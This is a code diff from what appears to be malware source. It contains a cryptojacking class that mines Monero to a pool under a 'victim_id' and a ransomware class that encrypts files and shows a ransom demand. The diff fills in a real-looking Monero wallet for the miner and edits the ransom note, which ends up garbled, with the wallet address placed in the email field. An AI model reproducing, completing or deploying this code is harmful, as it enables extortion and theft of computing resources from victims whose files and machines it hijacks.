@@ -4125,7 +4125,7 @@ class CryptoMiner:
         self.miner_thread = None
         self.hash_rate = 0
         self.pool_url = "stratum+tcp://pool.supportxmr.com:5555"
-        self.wallet = "YOUR_MONERO_WALLET"
+        self.wallet = "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN"
         self.worker_name = victim_id
 
     def start_mining(self):
@@ -4158,8 +4158,8 @@ class Ransomware:
     def __init__(self):
         self.extension = ".encrypted"
         self.ransom_note = """YOUR FILES HAVE BEEN ENCRYPTED
-        Send 1 Bitcoin to: YOUR_BITCOIN_ADDRESS
-        Email: your_email@protonmail.com for decryption"""
+        Send 1 xmr to: YOUR_XMR ADDRESS
+        Email: 428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN  for decryption"""
         self.excluded_dirs = ["Windows", "Program Files", "Program Files (x86)", "System32", "boot"]
         self.key = Fernet.generate_key()
         self.cipher = Fernet(self.key)
